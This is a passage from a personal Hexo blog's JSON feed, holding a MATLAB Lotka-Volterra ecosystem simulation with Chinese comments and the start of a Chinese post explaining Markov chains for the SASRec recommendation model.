class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">clear all</span><br><span class=\"line\">clc</span><br><span class=\"line\">close all</span><br><span class=\"line\">s=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ii=<span class=\"number\">0.56</span>:<span class=\"number\">0.01</span>:<span class=\"number\">0.85</span> <span class=\"comment\">%七思鳗的雄性比例</span></span><br><span class=\"line\"><span class=\"comment\">% 初始化模型参数</span></span><br><span class=\"line\">alpha = ii<span class=\"number\">-0.15</span>;  <span class=\"comment\">% 食饵的自然增长率</span></span><br><span class=\"line\"><span class=\"built_in\">beta</span> = <span class=\"number\">0.1</span>;  <span class=\"comment\">% 食饵被捕食的概率</span></span><br><span class=\"line\"><span class=\"built_in\">gamma</span> = <span class=\"number\">0.5</span>;  <span class=\"comment\">% 捕食者的自然死亡率</span></span><br><span class=\"line\">delta = <span class=\"number\">0.02</span>; <span class=\"comment\">% 捕食成功率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 初始化种群数量</span></span><br><span class=\"line\">x0 = <span class=\"number\">25</span>; <span class=\"comment\">% 初始食饵数量</span></span><br><span class=\"line\">y0 = <span class=\"number\">2</span>;  <span class=\"comment\">% 初始捕食者数量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置模拟时间</span></span><br><span class=\"line\">T = <span class=\"number\">0</span>:<span class=\"number\">0.1</span>:<span class=\"number\">50</span>; <span class=\"comment\">% 从0到50时间单位，每0.1单位计算一次</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 定义洛特卡-沃尔泰拉模型方程</span></span><br><span class=\"line\">lotkaVolterra = @(t, Y) [alpha*Y(<span class=\"number\">1</span>) - <span class=\"built_in\">beta</span>*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>); </span><br><span class=\"line\">                         delta*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>) - <span class=\"built_in\">gamma</span>*Y(<span class=\"number\">2</span>)];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 使用ode45求解器进行模拟</span></span><br><span class=\"line\">[T, Y] = ode45(lotkaVolterra, T, [x0 y0]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 绘制结果</span></span><br><span class=\"line\"><span class=\"built_in\">figure</span>;</span><br><span class=\"line\"><span class=\"built_in\">plot</span>(T, Y(:,<span class=\"number\">1</span>), <span class=\"string\">&#x27;r-&#x27;</span>, T, Y(:,<span class=\"number\">2</span>), <span class=\"string\">&#x27;b-&#x27;</span>);</span><br><span class=\"line\">xlabel(<span class=\"string\">&#x27;Time&#x27;</span>);</span><br><span class=\"line\">ylabel(<span class=\"string\">&#x27;Population&#x27;</span>);</span><br><span class=\"line\"><span class=\"built_in\">legend</span>(<span class=\"string\">&#x27;Prey&#x27;</span>, <span class=\"string\">&#x27;Predator&#x27;</span>);</span><br><span class=\"line\">title(<span class=\"string\">&#x27;Lotka-Volterra Predator-Prey Model&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% </span></span><br><span class=\"line\"><span class=\"comment\">% % 初始化模型参数</span></span><br><span class=\"line\"><span class=\"comment\">% alpha = 0.1;  % 食饵的自然增长率</span></span><br><span class=\"line\"><span class=\"comment\">% beta = 0.02;  % 食饵被捕食的概率</span></span><br><span class=\"line\"><span class=\"comment\">% gamma = 0.3;  % 捕食者的自然死亡率</span></span><br><span class=\"line\"><span class=\"comment\">% delta = 0.01; % 捕食成功率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 定义洛特卡-沃尔泰拉模型方程</span></span><br><span class=\"line\">lotkaVolterra = @(t, Y) [alpha*Y(<span class=\"number\">1</span>) - <span class=\"built_in\">beta</span>*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>); </span><br><span class=\"line\">                         delta*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>) - <span class=\"built_in\">gamma</span>*Y(<span class=\"number\">2</span>)];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置模拟的初始条件</span></span><br><span class=\"line\">initialConditions = [<span class=\"number\">40</span> <span class=\"number\">9</span>; <span class=\"number\">35</span> <span class=\"number\">5</span>; <span class=\"number\">50</span> <span class=\"number\">20</span>; <span class=\"number\">45</span> <span class=\"number\">15</span>]; <span class=\"comment\">% 不同的初始条件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置模拟时间</span></span><br><span class=\"line\">Tspan = [<span class=\"number\">0</span> <span class=\"number\">50</span>]; <span class=\"comment\">% 从0到50时间单位</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 创建图形窗口</span></span><br><span class=\"line\"><span class=\"built_in\">figure</span>;</span><br><span class=\"line\"><span class=\"built_in\">hold</span> on;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">%为每一组初始条件绘制相轨迹</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"built_in\">i</span> = <span class=\"number\">1</span>:<span class=\"built_in\">size</span>(initialConditions, <span class=\"number\">1</span>)</span><br><span class=\"line\">    [T, Y] = ode45(lotkaVolterra, Tspan, initialConditions(<span class=\"built_in\">i</span>, :));</span><br><span class=\"line\">    <span class=\"built_in\">plot</span>(Y(:,<span class=\"number\">1</span>), Y(:,<span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置图形属性</span></span><br><span class=\"line\">xlabel(<span class=\"string\">&#x27;Prey Population&#x27;</span>);</span><br><span class=\"line\">ylabel(<span class=\"string\">&#x27;Predator Population&#x27;</span>);</span><br><span class=\"line\">title(<span class=\"string\">&#x27;Phase Trajectories of Lotka-Volterra Model&#x27;</span>);</span><br><span class=\"line\"><span class=\"built_in\">legend</span>(<span class=\"string\">&#x27;Trajectory 1&#x27;</span>, <span class=\"string\">&#x27;Trajectory 2&#x27;</span>, <span class=\"string\">&#x27;Trajectory 3&#x27;</span>, <span class=\"string\">&#x27;Trajectory 4&#x27;</span>);</span><br><span class=\"line\">grid on;</span><br><span class=\"line\"><span class=\"built_in\">hold</span> off;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 初始化模型参数</span></span><br><span class=\"line\"><span class=\"comment\">% 草与兔子的相互作用参数</span></span><br><span class=\"line\"></span><br><span class=\"line\">alpha1 = <span class=\"number\">1</span>;  <span class=\"comment\">% 草的自然增长率</span></span><br><span class=\"line\">beta1 = <span class=\"number\">0.15</span>;  <span class=\"comment\">% 兔子吃草的效率</span></span><br><span class=\"line\">gamma1 = <span class=\"number\">0.5</span>-alpha*<span class=\"number\">0.01</span>;  <span class=\"comment\">% 兔子的自然死亡率，不考虑老鹰捕食的情况</span></span><br><span class=\"line\">delta1 = <span class=\"number\">0.03</span>; <span class=\"comment\">% 兔子因吃草而增加的存活率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 兔子与老鹰的相互作用参数</span></span><br><span class=\"line\"><span class=\"comment\">% alpha2 = 0.2;  % 兔子的自然增长率，考虑了吃草的影响</span></span><br><span class=\"line\">alpha2=alpha;</span><br><span class=\"line\">beta2 = <span class=\"number\">0.6</span>;  <span class=\"comment\">% 老鹰捕食兔子的效率</span></span><br><span class=\"line\">gamma2 = <span class=\"number\">0.25</span>;  <span class=\"comment\">% 老鹰的自然死亡率</span></span><br><span class=\"line\">delta2 = <span class=\"number\">0.02</span>; <span class=\"comment\">% 老鹰因吃兔子而增加的存活率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 定义模型方程</span></span><br><span class=\"line\">modelEquations = @(t, Y) [alpha1*Y(<span class=\"number\">1</span>) - beta1*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>);  <span class=\"comment\">% 草的增长方程</span></span><br><span class=\"line\">                          beta1*Y(<span class=\"number\">1</span>)*Y(<span class=\"number\">2</span>) - gamma1*Y(<span class=\"number\">2</span>) - beta2*Y(<span class=\"number\">2</span>)*Y(<span class=\"number\">3</span>);  <span class=\"comment\">% 兔子的增长方程</span></span><br><span class=\"line\">                          delta2*Y(<span class=\"number\">2</span>)*Y(<span class=\"number\">3</span>) - gamma2*Y(<span class=\"number\">3</span>)];  <span class=\"comment\">% 老鹰的增长方程</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置初始条件</span></span><br><span class=\"line\">initialConditions = [<span class=\"number\">100</span>; <span class=\"number\">10</span>; <span class=\"number\">5</span>];  <span class=\"comment\">% 初始条件：草、兔子、老鹰的数量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 设置模拟时间</span></span><br><span class=\"line\">Tspan = [<span class=\"number\">0</span> <span class=\"number\">50</span>];  <span class=\"comment\">% 模拟时间从0到100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% 使用ode45求解模型方程</span></span><br><span class=\"line\">[T, Y] = ode45(modelEquations, Tspan, initialConditions);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">%绘制结果</span></span><br><span class=\"line\"><span class=\"built_in\">figure</span>;</span><br><span class=\"line\"><span class=\"built_in\">plot</span>(T, Y(:,<span class=\"number\">1</span>), <span class=\"string\">&#x27;g-&#x27;</span>, T, Y(:,<span class=\"number\">2</span>), <span class=\"string\">&#x27;r-&#x27;</span>, T, Y(:,<span class=\"number\">3</span>), <span class=\"string\">&#x27;b-&#x27;</span>);</span><br><span class=\"line\">xlabel(<span class=\"string\">&#x27;Time&#x27;</span>);</span><br><span class=\"line\">ylabel(<span class=\"string\">&#x27;Population&#x27;</span>);</span><br><span class=\"line\"><span class=\"built_in\">legend</span>(<span class=\"string\">&#x27;Grass&#x27;</span>, <span class=\"string\">&#x27;Rabbits&#x27;</span>, <span class=\"string\">&#x27;Eagles&#x27;</span>);</span><br><span class=\"line\">title(<span class=\"string\">&#x27;Ecosystem Model: Grass, Rabbits, and Eagles&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">% 计算雅可比矩阵</span></span><br><span class=\"line\">    J = [alpha1-beta2*Y(<span class=\"keyword\">end</span>,<span class=\"number\">2</span>), -beta1*Y(<span class=\"keyword\">end</span>,<span class=\"number\">1</span>); delta1*Y(<span class=\"keyword\">end</span>,<span class=\"number\">2</span>), -gamma2-delta2*Y(<span class=\"keyword\">end</span>,<span class=\"number\">1</span>)];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">% 计算特征值</span></span><br><span class=\"line\">    eigenvalues = eig(J);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">% 判断稳定性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> all(<span class=\"built_in\">real</span>(eigenvalues) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>(<span class=\"string\">&#x27;系统稳定：&#x27;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>([<span class=\"string\">&#x27;alpha = &#x27;</span> num2str(alpha)]);</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>([<span class=\"string\">&#x27;雄性比例p=&#x27;</span> num2str(ii)])</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>(<span class=\"string\">&#x27;Eigenvalues:&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> <span class=\"built_in\">j</span> = <span class=\"number\">1</span>:<span class=\"built_in\">length</span>(eigenvalues)</span><br><span class=\"line\">            <span class=\"built_in\">disp</span>([<span class=\"string\">&#x27;Eigenvalue &#x27;</span> num2str(<span class=\"built_in\">j</span>) <span class=\"string\">&#x27;: &#x27;</span> num2str(eigenvalues(<span class=\"built_in\">j</span>))]);</span><br><span class=\"line\">        <span class=\"keyword\">end</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">disp</span>(<span class=\"string\">&#x27;系统不稳定：&#x27;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>([<span class=\"string\">&#x27;alpha = &#x27;</span> num2str(alpha)]);</span><br><span class=\"line\">        <span class=\"built_in\">disp</span>(<span class=\"string\">&#x27;Eigenvalues:&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> <span class=\"built_in\">j</span> = <span class=\"number\">1</span>:<span class=\"built_in\">length</span>(eigenvalues)</span><br><span class=\"line\">            <span class=\"built_in\">disp</span>([<span class=\"string\">&#x27;Eigenvalue &#x27;</span> num2str(<span class=\"built_in\">j</span>) <span class=\"string\">&#x27;: &#x27;</span> num2str(eigenvalues(<span class=\"built_in\">j</span>))]);</span><br><span class=\"line\">        <span class=\"keyword\">end</span></span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/recommendation/README/",
            "url": "https://enjundu.github.io/recommendation/README/",
            "title": "b_README",
            "date_published": "2024-07-04T01:41:31.000Z",
            "content_html": "<h2 id=\"a-b-s-t-r-a-c-t\"><a class=\"anchor\" href=\"#a-b-s-t-r-a-c-t\">#</a> A B S T R A C T</h2>\n<p>一些和推荐算法相关的自学过程</p>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/recommendation/SASRec/",
            "url": "https://enjundu.github.io/recommendation/SASRec/",
            "title": "SASrec",
            "date_published": "2024-07-04T01:41:31.000Z",
            "content_html": "<h1 id=\"self-attentive-sequential-recommendation\"><a class=\"anchor\" href=\"#self-attentive-sequential-recommendation\">#</a> Self-Attentive Sequential Recommendation</h1>\n<h2 id=\"马尔科夫链mc\"><a class=\"anchor\" href=\"#马尔科夫链mc\">#</a> 马尔科夫链（mc）</h2>\n<p>马尔科夫链（Markov Chain）是一种数学模型，用于描述一个系统从一个状态转移到另一个状态的过程。这种模型特别适用于分析随机过程，其中每个状态的转移仅依赖于当前状态，而与之前的状态无关。这种特性被称为 “马尔科夫性” 或 “无记忆性”。</p>\n<h3 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h3>\n<ul>\n<li><strong>状态空间（State Space）</strong>: 马尔科夫链中的所有可能状态的集合。状态空间可以是有限的，也可以是无限的。</li>\n<li><strong>转移概率（Transition Probability）</strong>: 从一个状态转移到另一个状态的概率，通常表示为 $P (X_{n+1}=j\\mid X_{n}=i) <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo separator=\"true\">,</mo><mtext>其中</mtext></mrow><annotation encoding=\"application/x-tex\">,其中</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span></span></span></span> X_n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>表示在时间</mtext></mrow><annotation encoding=\"application/x-tex\">表示在时间</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">间</span></span></span></span> n$ 的状态</li>\n<li><strong>转移矩阵（Transition Matrix）</strong>: 描述所有状态之间的转移概率的矩阵。对于一个有限状态空间的马尔科夫链，转移矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span></span></span></span> 的每个元素<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">P_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示从状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 转移到状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 的概率</li>\n<li><strong>初始分布（Initial Distribution）</strong>: 系统在初始时刻的状态分布，通常表示为一个向量。</li>\n</ul>\n<h3 id=\"类型\"><a class=\"anchor\" href=\"#类型\">#</a> 类型</h3>\n<ul>\n<li><strong>离散时间马尔科夫链（DTMC）</strong>: 时间步长是离散的，每个时间步系统转移一次。</li>\n<li><strong>连续时间马尔科夫链（CTMC）</strong>: 时间是连续的，系统可以在任意时刻发生状态转移。</li>\n</ul>\n<h3 id=\"马尔科夫链的性质\"><a class=\"anchor\" href=\"#马尔科夫链的性质\">#</a> 马尔科夫链的性质</h3>\n<ol>\n<li>\n<p><strong>稳态分布（Steady-State Distribution）</strong>: 在长期运行中，马尔科夫链可能会达到一个稳定的状态分布，即各状态的概率不再随时间变化。这种分布可以通过求解<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi><mi>P</mi><mo>=</mo><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi P=\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span> 来获得，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span> 是稳态概率向量。</p>\n</li>\n<li>\n<p><strong>回归性（Recurrence）</strong>: 如果一个状态从任意其他状态出发，总有一定的概率返回到该状态，则称这个状态是回归的。反之，如果返回概率为零，则称为瞬时的。</p>\n</li>\n<li>\n<p><strong>不可约性（Irreducibility）</strong>: 如果系统的任意两个状态之间都可以通过若干步转移相互到达，则称这个马尔科夫链是不可约的。</p>\n</li>\n<li>\n<p><strong>周期性（Periodicity）</strong>: 一个状态的周期定义为从该状态回到自身所需步数的最大公约数。如果这个周期为 1，则称该状态是非周期的。</p>\n</li>\n<li>\n<p><strong>稳态概率向量（Steady-State Probability Vector）</strong>，记作 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span>，是马尔科夫链中一个重要的概念。它描述了在长期运行中，系统各个状态的概率分布。当一个马尔科夫链达到稳态时，各个状态的概率将不再随时间变化。具体来说，如果一个马尔科夫链在某一时刻达到了稳态，那么无论经过多少次状态转移，系统各状态的概率将保持不变。</p>\n<ul>\n<li>\n<p><strong>不变形</strong>：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi><mi>P</mi><mo>=</mo><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi P=\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span> , 这里的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span> 是一个行向量，表示各状态的稳态概率，P 是转移矩阵，描述各状态之间的转移概率。</p>\n</li>\n<li>\n<p><strong>归一化条件</strong>：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mo>∑</mo><mi>i</mi></msub><msub><mi>π</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">\\sum_i\\pi_i=1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0497100000000001em;vertical-align:-0.29971000000000003em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.16195399999999993em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29971000000000003em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 即稳态概率向量的各个元素之和为 1，表示系统必定处于某个状态。</p>\n</li>\n<li>\n<p><strong>求解方法</strong>：要找到马尔科夫链的稳态概率向量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span>，通常需要解以下线性方程组：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>π</mi><mi>P</mi><mo>=</mo><mi>π</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msub><mo>∑</mo><mi>i</mi></msub><msub><mi>π</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding=\"application/x-tex\">\\begin{cases}\\pi P=\\pi\\\\\\sum_i\\pi_i=1\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.0000299999999998em;vertical-align:-1.25003em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">{</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.16195399999999993em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29971000000000003em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span 